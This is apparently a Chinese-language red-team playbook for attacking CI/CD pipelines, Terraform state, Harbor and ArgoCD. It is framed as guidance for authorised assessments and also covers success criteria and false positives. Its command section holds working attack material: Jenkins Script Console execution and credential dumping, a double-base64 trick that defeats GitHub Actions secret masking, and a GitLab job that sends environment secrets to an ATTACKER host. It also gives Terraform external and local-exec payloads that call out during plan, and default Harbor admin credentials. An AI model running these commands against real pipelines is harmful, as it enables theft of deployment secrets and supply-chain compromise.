# CI/CD、供应链与 IaC

> 适用：目标使用 Jenkins/GitHub Actions/GitLab CI、Terraform、Harbor 或 ArgoCD 的授权评估，落点是"拿部署凭据与制品控制权"，不是单台 shell。

## 认什么

### 1. 平台识别

| 标识 | 平台 | 首枪 |
|---|---|---|
| `.github/workflows/*.yml` | GitHub Actions | 触发器安全模型 + context injection |
| `Jenkinsfile` / `/script` | Jenkins | Script Console |
| `.gitlab-ci.yml` | GitLab CI | CI 变量 + `config.toml` |
| `.circleci/config.yml` | CircleCI | Context Secrets |
| `azure-pipelines.yml` | Azure DevOps | Service Connection |
| `.drone.yml` / `.buildkite/*.yml` | Drone / Buildkite | commands 注入 + agent 云权限 |
| `atlantis.yaml` | Atlantis | custom workflow |
| `*.tf` + backend | Terraform | state 凭据 |
| `serverless.yml` | Serverless Framework | IAM Role 与插件 |

默认端口：Jenkins `8080`、Atlantis `4141`、GitLab Runner metrics `9252`（Runner 主动轮询，默认不监听入站）、ArgoCD `8080` + Redis `6379`、Harbor `80/443`、Notary `4443`。

### 2. PPE 三分类（先问"我能改哪"）

- **D-PPE**：能改 workflow / Jenkinsfile / .gitlab-ci.yml。
- **I-PPE**：只能改构建依赖——`Makefile`、`build.sh`、`package.json` scripts、`requirements.txt`、`.tf`、Dockerfile/构建上下文。局限：只能用流水线原本就加载的 Secret。
- **3PE**：无写权限，靠外部 PR / issue / comment 触发。

| 触发器 | Secrets | 写权限 | 执行的代码 |
|---|---|---|---|
| `pull_request` | 无（GITHUB_TOKEN 只读） | 无 | PR 分支 |
| `pull_request_target` | 有 | 有 | 基分支（默认安全） |
| `workflow_run` | 有 | 有 | 取决于配置，常被链式利用 |
| `issue_comment` | 有 | 有 | 基分支（配 checkout PR ref 即 RCE） |

致命误用：`pull_request_target` 里写了 `ref: ${{ github.event.pull_request.head.sha }}`，等于在带 Secrets 与写权限的环境里跑攻击者代码。

### 3. 凭据落点（逐个点名）

Runner 环境变量、`/home/runner/work/_temp/*`（渲染后的脚本）、Runner.Worker/Listener 进程内存、`~/.docker/config.json`、`~/.kube/config`、`~/.aws/credentials`、`~/.config/gcloud/`、`~/.ssh/id_rsa`、`~/.terraform.d/credentials.tfrc.json`、`/etc/gitlab-runner/config.toml`、Jenkins `secrets/master.key` + `hudson.util.Secret`。

云穿越：OIDC（`id-token: write` → AssumeRoleWithWebIdentity）、Self-hosted Runner 的 `169.254.169.254`、`2375/tcp` Docker API、K8s DaemonSet 扩散。

### 4. IaC 与制品

- tfstate **明文**保存全部资源属性（含 `sensitive` 标记）、`terraform.tfstate.backup` 常被遗忘在磁盘；`*.tfvars`/`*.auto.tfvars` 是同一批密码。
- 远程后端：s3 / consul / http / azure blob / gcs。
- Harbor：`/api/v2.0/systeminfo`、`/v2/`、默认 `admin/Harbor12345`。
- ArgoCD：`/api/v1/version`、`/api/v1/applications`、`/api/v1/clusters`、Redis `6379`。

## 打哪（命令）

Jenkins：

```bash
curl -sk https://JENKINS/oops | grep -o 'Jenkins[^<]*'     # 版本（/error 同理）
# /script Groovy（需 Script Console 权限）
"id".execute().text
# 凭据转储：SystemCredentialsProvider.getStore() 取 UsernamePassword/StringCredentials 明文
# 离线解密所需：$JENKINS_HOME/secrets/master.key、hudson.util.Secret、credentials.xml
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<" $JENKINS_HOME
```

GitHub Actions（3PE / context injection，`${{ }}` 在 shell 前渲染，引号转义不防御）：

```bash
env | base64
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0   # 双重 base64 绕日志掩码
ls -la /home/runner/work/_temp/
```

GitLab CI（Protected 变量只在 Protected 分支可用 → 先造成 Protected 分支再跑）：

```yaml
exfil-secrets:
  script:
    - env | base64 | curl -X POST -d @- https://ATTACKER/collect
```

Terraform（state 是核心）：

```bash
jq -r '.resources[].type' terraform.tfstate | sort -u
jq -r '.resources[] | select(.type=="aws_iam_access_key") | .instances[].attributes | {user, id, secret}' terraform.tfstate
jq -r '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes | {endpoint, username, password}' terraform.tfstate
jq -r '.outputs | to_entries[] | {name: .key, value: .value.value}' terraform.tfstate
aws s3 cp s3://BUCKET/PATH/terraform.tfstate /tmp/tfstate
consul kv get terraform/state
jq -r '.credentials["app.terraform.io"].token' ~/.terraform.d/credentials.tfrc.json
curl -s -H "Authorization: Bearer $TFE_TOKEN" https://app.terraform.io/api/v2/workspaces/WS_ID/vars
```

IaC 注入（plan 阶段即执行，比 apply 更早）：

```hcl
data "external" "rce" {
  program = ["bash", "-c", "curl http://ATTACKER/$(whoami) >&2; echo '{}'"]
}
resource "null_resource" "exec" {
  provisioner "local-exec" { command = "curl http://ATTACKER/$(hostname)" }
}
```
State 篡改先备份再改，`jq '.serial += 1'`（serial 必须递增）；Module 无 commit hash 锁定时可 force-push 同名 tag 劫持。

Harbor：

```bash
curl -sk https://TARGET/api/v2.0/systeminfo | jq .
curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/users/current | jq .
curl -sk "https://TARGET/service/token?service=harbor-registry&scope=registry:catalog:*" \
  -u admin:Harbor12345 | jq -r '.token'
curl -sk -u admin:Harbor12345 "https://TARGET/api/v2.0/projects/PROJECT/repositories?page_size=100" | jq '.[].name'
docker history TARGET/PROJECT/IMAGE:TAG --no-trunc
```
管理员面还有：Webhook 策略（事件外传）、复制策略（把镜像同步到自有 Registry）、Robot Account（持久化）、Trivy 报告（`X-Accept-Vulnerabilities` 头取 CVE）。

ArgoCD：

```bash
curl -sk https://TARGET/api/v1/version
curl -sk https://TARGET/api/v1/applications | jq '.items[].metadata.name'
curl -sk https://TARGET/api/v1/clusters
# Redis 6379 未认证 + CVE-2024-31989（< 2.11.5）→ 缓存投毒 → K8s 接管
# SSO 面：CVE-2022-29165（< 2.3.1）、CVE-2023-22482（< 2.3.13 / < 2.4.19 / < 2.5.6）
```

## 什么算成

- Jenkins：`/script` 返回命令输出；凭据转储打出 `id: username / password` 明文。
- Actions：PR 触发的运行里 base64 输出出现真实 secret 值——"日志里是 `***`、base64 后是明文"这个差异本身就是证据。
- Terraform：state 里 jq 出 AccessKeyId + SecretAccessKey，并用其完成一次只读云调用（如 `aws s3 ls`）成功；或 plan 阶段 `external` data source 回连成功。
- Harbor：`systeminfo` 返回 `harbor_version` 且 admin 登录 200；镜像层解出 `.env`/kubeconfig/私钥（给路径与关键行，不整包外带）。
- ArgoCD：`/api/v1/version` 未授权 200 且 `/api/v1/clusters` 返回真实集群地址；Redis 可达且版本命中 CVE 时，按 CVE-2024-31989 的利用条件给证据。
- 写侧（后门镜像、复制策略、恶意 Application）：授权内只到证明层，先记原 manifest digest / 原 Application 定义以便回滚。

## 假点

- Jenkins `/script` 302 到 login：未授权不成立。
- Harbor `admin` 401 但公开项目可列：只有公开面。
- tfstate 里的凭据已被轮换：用它调云 API 401，不能写"云环境沦陷"。
- TFC Token 只读且 workspace 无 sensitive var：只拿到元信息。
- ArgoCD `/api/v1/version` 200 但 `applications` 401：只报版本与端点暴露。
- `pull_request` 触发器没有 Secrets：注入只拿只读 token，别扩写成"CI 沦陷"。
- Registry `/v2/` 401、Harbor 有登录页：正常认证，不是弱口令。
- 只拿到凭据文件的路径、读不出内容（权限不足）：假点。

## 与其他包联动

- 容器/集群侧落地与横向：`./cloud-06-K8s攻击面-逃逸与集群.md`、`./cloud-07-K8s攻击面-组件-网络-存储.md`、`./cloud-08-容器运行时与镜像.md`。
- tfstate 与 CI 产物常在对象存储里：`./cloud-09-对象存储与Serverless.md`。
- OIDC/SSO 认证绕过细节：`../../web-auth-access/knowledge/oauth-jwt-test.md`。
- 变更类操作边界：`../../../../rules/20-min-harm.md`；报告与定级：`../../../../rules/40-evidence-report.md`。
